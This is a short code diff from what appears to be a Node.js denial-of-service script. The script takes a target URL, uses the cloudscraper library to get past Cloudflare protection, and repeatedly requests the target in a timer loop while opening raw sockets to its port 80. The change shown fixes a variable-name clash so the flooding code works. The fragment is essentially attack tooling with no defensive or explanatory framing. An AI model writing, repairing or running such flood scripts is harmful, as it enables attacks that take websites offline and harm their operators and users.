@@ -3,10 +3,10 @@ const url = require("url");
 const emitter = new EventEmitter();
 emitter.setMaxListeners(Number.POSITIVE_INFINITY); 
 const cloudscraper = require("cloudscraper");
-var url = process.argv[2];
-var host = url.parse(url).host
+var target = process.argv[2];
+var host = url.parse(target).host
 var int = setInterval(()=>{
-var config = {url:url,resolveWithFullResponse: true}
+var config = {url:target,resolveWithFullResponse: true}
 cloudscraper.get(config,(err,r)=>{
 const s = require("net").Socket()
 s.connect(80,host)
